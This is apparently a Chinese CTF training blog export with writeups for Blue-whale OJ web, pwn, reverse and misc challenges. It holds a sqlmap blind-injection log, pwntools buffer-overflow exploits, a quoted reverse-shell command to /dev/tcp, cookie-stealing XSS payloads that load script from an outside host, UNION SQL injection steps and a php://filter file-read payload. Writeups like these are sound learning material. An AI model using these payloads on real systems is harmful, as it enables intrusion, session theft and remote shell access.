&quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;104) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 182 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;100) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;102) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 182 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;101) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot; 二分法思路 mid为left和right的中间值，mid是否和left相等，相等跳到5，如果不等跳到2 请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到4 返回页面正确，将right赋值为mid 返回页面错误，将left赋值为mid 返回mid值 sql语句解析 RLIKE(),不区分大小写的不完全匹配，此处用来将admin与二分查找后再判断的结果(CASE WHEN ……THEN 0x61646d696e ELSE 0x28 END)进行匹配，如果匹配成功则说明查找语句正确ORD(),返回字符串第一个字符的 ASCII 值,MID()用来提取字符SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1) 就是在walawala.fl4g库中查找flag，IFNULL函数用于将NULL值替换为另外一个值 逐个字符分析二分法的结果每次ORD(MID())查询的参数加一，说明查到了一个字符，于是就以之为每个字符的分界。以上面第一个为例，判断第一个字符是否大于64√→是否大于96√→是否大于112×→是否大于104×是否大于100√→是否大于102×→是否大于101经过如上的一系列判断，即可得知第一个字符为f。逐个字符分析即可得到flag。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day9 pwn","date":"2020-03-16T07:27:39.000Z","path":"2020-03-16/Stage1Day9-pwn/","text":"Blue-whale OJshellcode writeup. shellcode查看文件类型&amp;保护机制 与第一关不同，没有开启NX（不可执行），此时可以尝试在数据所在内存页写入shellcode 反编译结果12345678910int sub_804851A()&#123; char buf; // [esp+Ch] [ebp-1Ch] sub_80484EB(); puts(\"input your name\"); read(0, &amp;buf, 0x100u); printf(\"hello \"); return printf(&amp;buf);&#125; 可以看到与第一关一样read函数发生缓冲区溢出，buf大小为0x1Ch，读入了0x100h，可以尝试在执行read函数时写入shellcode。于是问题的关键就在于：如何找到buf在栈中的储存位置（以便修改返回地址指向shellcode）？ 动态调试确定buf在栈中位置 使用IDA的Remote Linux Debugger实现对pwn3的动态调试step1:将IDA目录\\dbgsrv\\里的linux_server文件放在linux里pwn3所在的同一目录（若是64位文件则使用linux_server64） step2:在linux下运行该文件:./linux_server开始监听step3:在IDA菜单栏→Debugger→switchdebugger中选择linuxdebugger，并完成配置 在push 0处设置断点，可以看到buf的地址以作为read的参数入栈：向buf输入“hello”，查看并验证栈中的情况：可以看到hello已经写入buf地址的栈中（逆序是因为小端序） 然而再次运行、调试发现buf在栈中的位置并不固定： 动态定位shellcode 解决方案：利用jmp esp运行shellcode原理解析思路：利用任意一个jmp esp指令的地址覆盖返回地址→覆盖buf和ebp→在返回地址之后紧跟着布置shellcode→函数在返回后将被定向去执行内存中的jmp esp指令→jmp esp指令执行后，处理器会到栈区函数返回地址之后的地方取指令执行，即shellcode jmp esp的机器码为FFE4，在文件中的地址为08048667。 payload:(0x1ch+0x4h)*a +[jmp esp]+shellcode exp123456from pwn import *r = remote('vps1.blue-whale.me',9992)shellcode=asm(shellcraft.sh())payload = 32*'a' + p32(0x08048667) + shellcoder.send(payload)r.interactive()","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"pwn","slug":"pwn","permalink":"https://purewhitywhite.github.io/tags/pwn/"}]},{"title":"Stage1Day8 Misc","date":"2020-03-15T12:52:46.000Z","path":"2020-03-15/Stage1Day8-Misc/","text":"Blue-whale OJForensics1、Forensics2、Shell writeup. Forensics1根据提示过滤http流量：跟踪http流，可知请求与返回的大概流程：打开网页→获取ico→三次输入密码→进入secretpage→获取s3cret.png于是将s3cret.png导出分组字节流→修改后缀名为图片格式→获得flag Forensics2知识补充 NFS实现了一个跨越网络的文件访问功能，其整个架构为Client-Server架构，客户端和服务端通过RPC协议进行通信，RPC协议可以简单的理解为一个基于TCP的应用层协议，它简化命令和数据的传输。 Mount: 从客户端的角度来说，NFS中的第一个操作称为 mount，Mount 代表将远程文件系统加载到本地文件系统空间中。 题解根据题目的hint，优先考虑与文件相关的NFS协议。过滤NFS流量，一番观察后可以看到flag.txt.gz： 继续向下看，双方大概进行了一番认证和目录的搜索，然后就到了用户向服务器写入数据的部分了： 查看数据包的详细内容，注意到contents部分很有可能含有flag（不过是乱码）：注意到这是个压缩文件，于是将其以压缩文件的形式解码，得到flag： Shell先看http流量，url为http://192.168.247.130/shell.php?cmd=bash -c &#39;bash -i &gt; /dev/tcp/192.168.247.128/12345 &lt;&amp;1 2&gt;&amp;1&#39;]貌似是建立了一个反弹shell，跟踪tcp流量就可看到行为： 对于www-data@UbuntuServer16:/tmp/flag$ cat flag.txt | base64 -w 0 | python -c &quot;print raw_input().swapcase()&quot;，再结合下面返回的zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k，说明这就是flag里的内容，不过经过base64编码后再swapcase大小写互换，那么写脚本再改变大小写之后base64解码可得到flag： 1234import base64code = \"zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k\"flag = base64.b64decode(code.swapcase())print(flag)","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day7 pwn","date":"2020-03-14T08:47:23.000Z","path":"2020-03-14/Stage1Day7-pwn/","text":"Blue-whale OJbof writeup. bof(buffer overflow)查看文件类型&amp;保护机制 可以看到这是一个32位的elf文件，开启了NX保护。 checksec检查的保护机制： STACKCANNARY(栈保护)：这个选项表示栈保护功能有没有开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 NX(DEP)：NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 PIE（ASLR）：一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。内存地址随机化机制（address space layout randomization)，有以下三种情况：0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 reference：https://bbs.pediy.com/thread-250538.htm 进入IDA查看漏洞部分汇编代码： 123456789101112131415161718192021222324buf= byte ptr -1Chpush ebpmov ebp, espsub esp, 28h; 4: sub_804851B();call sub_804851B; 5: sub_804854A();call sub_804854A; 6: puts(\"can you pwn me?\");sub esp, 0Chpush offset s ; \"can you pwn me?\"call _puts; 7: return read(0, &amp;buf, 0x100u);add esp, 10hsub esp, 4push 100h ; nbyteslea eax, [ebp+buf]push eax ; bufpush 0 ; fdcall _readadd esp, 10hnopleaveretn 结合反编译后结果: 123456789ssize_t sub_8048573()&#123; char buf; // [esp+Ch] [ebp-1Ch] sub_804851B(); sub_804854A(); puts(\"can you pwn me?\"); return read(0, &amp;buf, 0x100u);&#125; 几点分析 buf开辟空间大小：1Ch（buf= byte ptr -1Ch） read函数向buf里可写100h字节的数据→栈溢出 参数从右向左入栈+调用方清理栈（每次call之后就add esp,10h）=__cdecl 栈结构以及调用关系： 如何getshell：system(&#39;/bin/sh&#39;); system()和/bin/sh位置： 确定覆盖位数和方法：1ch * a(buf)+4 * a(read()函数ebp)+0804A05C(system()地址)+4 * a(system()的虚拟返回地址)+0804A02C(system()的参数) exp&amp;getflag1234567from pwn import *r = remote('vps1.blue-whale.me',9990)system = 0x080483F0bin = 0x0804A02Cpayload = 'a'*32 + p32(system) + 'a'*4 + p32(bin)r.send(payload)r.interactive()","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"pwn","slug":"pwn","permalink":"https://purewhitywhite.github.io/tags/pwn/"}]},{"title":"Stage1Day6 Misc","date":"2020-03-13T14:59:03.000Z","path":"2020-03-13/Stage1Day6-Misc/","text":"Blue-whale OJAnother 01Game、Exif、PkCrack writeup. Another 01Game解题思路 0和1的数量很关键，首先统计0和1的数量： 1369.0/7 = 195.571428571428581369.0/8 = 171.1251369.0 ** 0.5 = 37.01369不是7和8的倍数，说明很可能和ASCII没关系。1369是37的平方，说明可以由0和1正好组成一个正方形（二维码，QR code） 统计字符串长度，可以当作 ASCII 编程解出 flag题目给出的提示非常清晰，下面开始写脚本进行二维码制作+flag获取：题解 使用qrcode包进行二维码生成12345678910111213141516import qrcodeqr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=2,)qr.add_data(\"0000000111011101100011011111010000000011111011011101111001100100101011111001000101011011101101000101010101000100100010110110011001101001010010100010010001011011001101000101010001010001001111101110001000011001010111101111100000000101010101010101010101010000000111111110110111010101100000011111111100010000011101110101010101010001110110001101110100010001010010100101010101011111001110010000110111000011110100111100011011100010110101001011101101001110100101101100101100110110110100010010010100100110010101110101010101010111111000000110111100001100111101000101001101110101110101110001010001010010011110010101011100010101111101001001101000111101000100110101010010011001010110000100000100010110010101010111010100101110101000100101110101010111010100000100000011001101010100011111010010100101011001100101010101110100100100100010010101101111010100111011001001001100010110011101000011110101110001011100000011110111010110001011111000010110001101110001001001010111101101000001111100111001000100110110100001101011001011011010001000011001011001100000010111000110110001011001010100000100011111111000011001010110011000111001010000000100111011101101110001010101000011111010100111001101010110101110001001000101001101110011001111100000001010100010110000011000011101010001000100010001010000010101001010101101000001001111101001100000101100011101000100110000000100101100100011011011001010110\")qr.make(fit=1)img = qr.make_image()img.save(\"qr.png\")# 扫出来结果貌似一直是它本身，看了半天决定上网上搜一下扫出来的结果。。。如下d = \"110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101\"for i in range(0, 189, 7): s = d[i:i+7] print(chr(int(s, 2)), end='') Exif什么是Exif 可交换图像文件格式（英语：Exchangeable image file format），是专门为数码相机的照片设定的文件格式，可以记录数码照片的属性信息和拍摄数据。 Exif信息是可以被任意编辑的，因此只有参考的功能。 Exif信息以0xFFE1作为开头标记，后两个字节表示Exif信息的长度。所以Exif信息最大为64 kB，而内部采用TIFF格式。 Exif数据结构题解使用Exiftool打开图片，可以在Credit中看到一串形似ascii码的数字，查表可得到flag。 PkCrack已知明文攻击 大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。题解如图所示，选自被加密的文件和现有的明文，很快便可以生成被加密文件的解密版，打开即可看到flag。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day5 Web","date":"2020-03-12T11:38:25.000Z","path":"2020-03-12/Stage1Day5-Web/","text":"XSS2 writeup. 本题目与XSS1的不同之处在于并没有告知过滤了哪些字符，我们将XSS1的payload输入后直接查看被过滤后的结果： hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);// 可以看到后台将替换为空，将单引号和双引号用反斜杠转义了。结合给出的提示，看到html使用GBK编码，联想到使用宽字节注入： 如何使用&amp;防御 “宽字节”：GB2312、GBK、GB18030、BIG5、Shift_JIS等，占两字节；ASCII占一字节。 触发条件：PHP6以下+magic_quote_gpc=on+使用 addslashes()函数对输入的单引号、双引号 、 反斜杠和 NULL 进行转义处理 利用方法: 输入%df%22时首先经过上面 addslashes 函数转义变成了%df%5c%22（%5c是反斜杠\\），之后后台将被转义后的输入数据返送回前端，前端对其进行 GBK 编码，那么%df%5c 转换成了一个汉字，而双引号就逃逸了出来： 防御手段：由于 php6 以上的版本 get_magic_quotes_gpc 选项被删除，故不可以再使用addslashes()函数进行转义。对于宽字节SQLi，可以用 mysqli_real_escape_string函数代替以前的addslashes 函数， 他们之间的区别就是 mysql_real_escape_string 会根据mysql 对象中的 mysql-&gt;charset 属性来对待传入的字符串，因此可以根据当前字符集来进行过滤，从而防止了宽字节注入。 后续处理虽然实现了双引号逃逸，但可以看到payload里还是有双引号和单引号，这时若被转义则不会生效。此时可以使用fromCharCode()函数进行绕过，这样可以将payload部分转为他们的ascii值，然后作为参数传入这个函数，从而达到防止被转义和过滤的目的。 1payload:name=%d5%22;document.write(String.fromCharCode(102,34,60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,120,115,115,46,102,98,105,115,98,46,99,111,109,47,78,88,69,79,39,59,62,34));// 由于对pwn的了解不足，先对相关知识进行储备： pwntools PLT&amp;GOT","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"}]},{"title":"Stage1Day4 Reverse&Misc","date":"2020-03-11T10:46:44.000Z","path":"2020-03-11/Stage1Day4-Reverse-Misc/","text":"Blue-whale OJReverse sign in、junior math、LSB&amp;LSB2 writeup. 首先搞清楚一个一直都没弄清楚的问题，什么是逆向，什么是pwn（好像都是对着一堆汇编调来调去啊）？ 逆向工程（Reverse engineering），又称反向工程，是一种技术过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能性能规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是，在无法轻易获得必要的生产信息下，直接从成品的分析，推导产品的设计原理。-逆向工程-ctf-wiki 根据我做过的一点逆向题目，感觉就是把文件拖到IDA或者ollydbg里先静态分析一些文件，包括它的一些代码混淆加壳等的，再动态调试之类的吧 ”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。 我的理解就是利用程序存在的一些问题诸如堆、栈溢出，rop，uaf之类的，来执行shellcode，最后获得目标机器的root权限。 x64dbg vs Ollydbg vs IDA Pro Reverse sign in用IDA打开之后直接按F5，main函数已经出来了： 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 result; // rax char s; // [rsp+0h] [rbp-30h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); printf(\"Please input your flag:\", a2, a3); __isoc99_scanf(\"%32s\", &amp;s); if ( strlen(&amp;s) == 32 ) &#123; if ( (unsigned int)sub_400686((__int64)&amp;s) ) puts(\"Right!\"); else puts(\"Wrong!\"); result = 0LL; &#125; else &#123; puts(\"Wrong!\"); result = 0LL; &#125; return result;&#125; 可以看到程序是一个flag检验器，输入flag后先判断有没有32个字符，进而再判断将输入的值带入一个sub_400686函数后的返回值，若是1就说明是flag。进入sub_400686看看： 1234567891011signed __int64 __fastcall sub_400686(__int64 a1)&#123; signed int i; // [rsp+Ch] [rbp-Ch] for ( i = 0; i &lt;= 31; ++i ) &#123; if ( (char)(*(_BYTE *)(i + a1) ^ byte_400818[i]) != i ) return 0LL; &#125; return 1LL;&#125; 意思是将a1（输入的值）逐位与byte_400818这个数组逐位进行^（异或）操作，如果他们的结果==循环变量i，那么就返回1（输入的flag对了）。看看byte_400818： x dup(y)，x是重复的次数，（）里的y是要重复的数刚好32个字符，那么可以编写脚本来找flag，思路是这样的，flag[i]^byte_400818[i] == i，那么flag[i] == byte_400818[i]^i 代码： 1234# 先转十进制d = [102, 109, 99, 100, 127, 60, 54, 114, 87, 66, 100, 59, 123, 82, 124, 60, 102, 84, 96, 96, 39, 74, 73, 127, 113, 88, 82, 114, 125, 117, 42, 98]for i in range(32): print(chr(d[i] ^ i), end='') junior math按F5查看伪代码： 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; printf(\"Please input your flag:\", a2, a3); __isoc99_scanf(\"%32s\", &amp;byte_602080); sub_4005D6(); sub_40063F(); sub_4006A8(); sub_400711(); sub_40077A(); sub_4007E3(); sub_40084C(); sub_4008B5(); sub_400918(); sub_400981(); sub_4009EA(); sub_400A53(); sub_400ABC(); sub_400B25(); if ( dword_602064 ) puts(\"Wrong!\"); else puts(\"Right!\"); return 0LL;&#125; 问题：print为何还输入了a2 a3两个参数？ 看到输入flag后进行了一堆函数运算，最后判断dword_602064这个东西是0的话输入值即为flag。进入一个函数看看： 12345678910__int64 sub_4005D6()&#123; _BOOL4 v0; // edx __int64 result; // rax v0 = (byte_602080 - 147) * byte_602080 != -4590 || (byte_602082 - 147) * byte_602082 != -4850; result = v0 | (unsigned int)dword_602064; dword_602064 |= v0; return result;&#125; 看到这个函数计算了输入字符串的第1位（byte_602080）进行运算后与-4590进行判断，如果这个将第一位带入左边的式子计算结果不等于-4590，那么||（或）的左侧就是一个1，如果等于的话就是0。返回值result貌似没有起到作用不分析，然后将dword_602064与v0进行逐位或，结果存入v0。看了其他的函数结构都一样，变化的就是测试的是输入字符串的第几位。可以看出我们每一次都要满足v0是0，这样才能保证v0与dword_602064逐位或之后才不会出现1（出现1就错了），那么就要式输入字符串的每一位都满足每个函数里的一元二次运算。试着挑一个算了算，(byte_602080 - 147) * byte_602080 = -4590的一个解为102，查ascii表为f，就很显然了。把每一位结果都算出来查ascii即可得到flag。 LSB&amp;LSB2最低有效位（LSB）的原理：因为每个图片的颜色都是由“红”、“绿”、“蓝”三种颜色组成，图片中的其他颜色均可以由这三种颜色混合而成。然而PNG的每种颜色的大小在储存位中占8bit，而LSB隐写原理就是把每种颜色的最后一位进行改写，但是改写后的图片和原图相比，在人的眼中是没有区别的。 题解stegsolve打开图片后调整到Red plane0页面就可以看到这个二维码，扫码即得到flag。LSB2的话用lint里提示的zsteg -a secret.png即可看到flag。","tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"},{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day3 Web&Misc","date":"2020-03-10T11:07:53.000Z","path":"2020-03-10/Stage1Day3-Web-Misc/","text":"Blue-whale OJBasic SQL、Invisible flag、docx writeup. Basic SQL上来先确定是什么类型的注入，当输入&#39;时候出错，说明这是一个字符型的注入点。首先看当前数据表有几列，试到4时出错，说明有三列 1&apos; order by 4# 接下来看前三列中回显在哪几列 1&apos; union select 1,2,3# 可以看到最下面显示了2、3俩数字，表示可以利用这两个位置回显我们想要的结果，比如当前数据库数据库名、版本： 12&apos; union select 1,database(),version()#//回显为news，5.5.62 再看看所有的库名： 12&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata#回显为information_schema,news，information_schema库是MySQL自带的，它提供了访问数据库元数据（数据库名或表名、列的数据类型、访问权限等）的方式，优先看news库 接下来就是爆表、列、数据了：爆表： 12&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;news&apos;#//回显为f1agfl4gher3,news，进f1agfl4gher3看看 爆列： 12&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;f1agfl4gher3&apos;#//回显为id,h3r31sfl4g，flag快来了 爆数据： 12&apos; union select 1,group_concat(id),group_concat(h3r31sfl4g) from f1agfl4gher3#//回显就有flag 这比较基础，就是sqli-labs第二关吧，不过sql注入各种操作很多，还有sqlmap的使用，这都是以后要学习的东西 Invisible flag看到图片只有一半的BLUE-WHALE，再结合提示里的图片长度，就知道了应该使用010editor来修改图片的长度了：将修改后的结果导出为一个新的图片，即可在下方看到flag。 docx结合提示知道docx格式的文件本质上是一个zip文件，修改后缀名后就可以解压。一个docx文件可能会包含这些目录和组件： [Content_Types].xml这个文件描述的是整个文档内容的类型，把各个xml文件组合成一个整体。 docProps文件夹这个文件夹中的xml记录了docx文档的主要属性信息Core.xml：描述文件的创建时间，标题，主题和作者等给予open xml约定文档格式的通用文件属性App.xml：描述文档的其他属性，文档类型，版本，只读信息，共享，安全属性等特定的文件属性 rels 文件夹这个文件夹存放了所有指定的rels文件.res文件描述了文档结构中的起始关系，也可以叫做关系部件 item1.xml包含了一些文档中出现的数据。例如自定义XML数据部件。 打开修改后缀名后的文件，即可看到flag.xml，打开即可看到flag。 体会 比较熟悉的Web部分做完了，接下来就是Misc、逆向和pwn了，都没咋做过，希望一切顺利","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"}]},{"title":"Stage1Day2 Web","date":"2020-03-09T14:12:50.000Z","path":"2020-03-09/Stage1Day2-Web/","text":"Blue-whale OJBabyXSS、XSS1、BasicFileInclude writeup. BabyXSS 可以看到这个输入框应该就是注入点了。下面这个地方要求输入一个md5后前六位恰好为等号右边的字符串，一开始以为是找碰撞之类的吧，不过结合hint里推荐的proofofwork来看应该是要慢慢试出来。不过在安装cmake、MinGW，多次google设置cmakefile均无果后选择使用hashlib包。 123456import hashlibfor i in range(9999999999): s = hashlib.md5(str(i).encode(encoding='utf8')).hexdigest() if s.startswith(\"xxxxx\"): print(i) break 之后就很轻松了，得到对应的字符串后，在上方的留言框里放入获取cookie的脚本，即可将其提交到管理员的后台，（管理员在看到这条信息时）XSS平台便收到了管理员的token：使用Burp抓包，将自己的cookie替换为这个token再发包即可得到flag。 XSS1 这题与BabyXSS比较相似，也是获取管理员的cookie，不过这一次我们可以看到被注入xss的页面以及它过滤一些敏感符号的代码： 12345678910111213141516&lt;form action=\"\" method=\"GET\"&gt; &lt;input type=\"text\" name=\"name\" autofocus=\"autofocus\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt;&lt;?phpif(isset($_GET['name']))&#123; $text = $_GET['name']; $text = str_replace('\"','',$text); $text = str_replace('&gt;','',$text); $text = str_replace('&lt;','',$text); $text = str_replace(\"\\n\",'',$text); echo \"&lt;svg&gt;&lt;script&gt;var a=\\\"\". $text . \"\\\"&lt;/script&gt;&lt;/svg&gt;\";&#125;echo '&lt;hr /&gt;';show_source(__FILE__); 可以看到本题对” &lt; &gt; 以及回车进行了过滤，便考虑使用html编码来绕过。 hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);// 先将双引号闭合，再在html中写进去一个src属性为x（会出错）的img标签，然后onerror会在html中写进去一个src属性为cookie偷取链接的script，最后将后面的一个双引号注释掉。此处之注意将空格也进行编码处理（在提交的页面会进行检测）。输入文本框提交看看效果： 可以看到成功地写入了上面提到的img标签，并触发了chrome XSS Auditor的预警。 PS:不知道出了什么问题XSS平台一直收不到cookie，有待进一步观察 注意到hint里提示，发现输入框有autofocus属性，想到可以结合onfocus来触发XSS，但是这个输入框已经闭合了，注入点并不在其中，又想到自己搞一个文本框，设置一个autofocus，这样管理员进入评论管理版后不用任何操作就会发送flag，但实测这样貌似还是不行 BasicFileInclude 题目提示”flag就在这里，但是你看不到“。暗示要读取flag，鉴于不知道当前路径（无法使用file协议）,即考虑使用php伪协议php://filter php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 这是其参数： resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 123php://filter/read=convert.base64-encode/resource=upload.php这里读的过滤器为convert.base64-encode，即把输入流base64-encode。resource=upload.php，代表读取upload.php的内容 问题：一定要使用base64吗？还是说这是一种固定形式（网上几乎都是这种解答） 照葫芦画瓢地构造payload: http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag 网页上返回了一串base64编码，解码后发现这就是flag的代码。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"}]},{"title":"Stage1Day1 Web","date":"2020-03-08T11:46:09.000Z","path":"2020-03-08/Stage1Day1-Web/","text":"Blue-whale OJcalculator、RapidTyping、Basic PHP、Basic PHP 2 writeup. 今天是测试第一阶段的第一天。Keep posting! Calculator RapidTyping Basic PHP Basic PHP 2 总结Calculator 从题目要求可以看到，需要在1.5s内计算出一个比较大的四则运算。按计算器估计是来不及了，由hint我们知道用Python来实现。先贴代码： 12345678910111213import requestsfrom bs4 import BeautifulSoupurl = \"http://vps1.blue-whale.me:23331/calculator/\"cal_session = requests.session()cal_respond = cal_session.get(url)# print(cal_respond.text)soup = BeautifulSoup(cal_respond.text, 'lxml')span = soup.find(\"span\", id=\"exp\")num = eval(span.text.replace('=', ''))# print(num)ans = &#123;\"answer\": num&#125;r = cal_session.get(url, params=ans)print(r.text) 代码分为几个阶段：首先使用了requests，它是基于urllib3的一个用于发起http请求的包；之后引入了比较常见的BeautifulSoup。创建一个session对象后，发送请求并获得返回的response对象。 接下来将其转为BeautifulSoup对象，找到其中id为exp的span标签，将其内容去掉最后的等号后作为参数传入eval函数，将计算结果封装为get的参数，再次请求得到返回的带有flag的网页。 通过这个入门题目可以练习常用包requests和BeautifulSoup的使用。 RapidTyping 这个题目跟上个题目有点相似，也是要求在短时间内完成验证码输入。题目给出hint说不是用图像识别啥的，那就看看网页源代码吧。 做过的CTF题目不多，多是入门题，发现这种比较入门的题目通常要结合Base64之类的东西来考察，或者是在前端做一些限制。把后面这堆结尾是等号的代码拖到Base64解码里会发现是一大堆形似html的代码，其中text标签中包含的就是图片中的字母。下面贴上代码： 12345678910111213141516171819202122import requestsfrom bs4 import BeautifulSoupimport base64url = \"http://vps1.blue-whale.me:23331/captcha/\"session = requests.session()respond = session.get(url)soup = BeautifulSoup(respond.text, \"lxml\")# print(soup.img.attrs[\"src\"])encoded = soup.img.attrs[\"src\"].lstrip(\"data:image/svg+xml;base64,\")# print(encoded)encoded = base64.b64decode(encoded)soup = BeautifulSoup(encoded, \"lxml\")decoded = soup.find_all(name=\"text\")ans = \"\"for i in range(500): for s in decoded: if i == int(s[\"x\"]): ans += str(s.text)# print(ans)answ = &#123;\"code\":ans&#125;r = session.get(url,params=answ)print(r.text) 代码逻辑如下：依然是requests+BeautifulSoup获取页面内容，截取img标签src属性中的base64部分后解码，将text部分提取出来后带入二重循环，保证将每个字母按照x坐标的顺序加入到ans字符串中。最后将结果作为参数再次请求得到flag。 